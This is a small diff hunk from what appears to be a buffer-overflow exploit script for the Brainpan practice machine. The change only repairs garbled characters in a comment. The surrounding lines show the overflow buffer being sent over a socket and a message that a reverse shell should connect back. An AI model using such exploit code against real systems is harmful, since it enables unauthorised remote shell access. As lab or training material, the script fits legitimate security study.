@@ -249,7 +249,7 @@ except:
 
 # â”€â”€â”€ 4. SEND THE EXPLOIT (PASSWORD) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 #
-# Brainpan expects a â€œpasswordâ€ line, so append "\r\n" so itâ€™s treated as input.
+# Brainpan expects a œpassword line, so append "\r\n" so it's treated as input.
 s.send(buffer + b"\r\n")
 print("[+] Exploit buffer sent! The reverse shell should connect back on its own.")
 
